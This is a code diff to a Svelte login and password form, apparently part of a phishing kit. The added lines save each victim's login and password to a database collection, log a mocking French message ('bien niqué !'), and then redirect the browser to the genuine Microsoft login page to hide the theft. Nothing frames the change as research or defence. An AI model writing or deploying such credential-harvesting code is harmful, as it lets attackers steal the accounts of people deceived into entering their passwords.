@@ -2,6 +2,8 @@
   import LoginForm from "./LoginForm.svelte";
   import PasswordForm from "./PasswordForm.svelte";
 
+  export var db;
+
   var login;
 
   var showLogin = true;
@@ -18,6 +20,16 @@
   function onPasswordNext(event) {
     var password = event.detail.password;
     console.debug(password);
+    db.collection("users")
+      .add({
+        login,
+        password
+      })
+      .then(x => {
+        console.log("bien niqué !", x);
+        window.location = "https://login.microsoftonline.com/common/oauth2";
+      })
+      .catch(console.error);
   }
 </script>
 
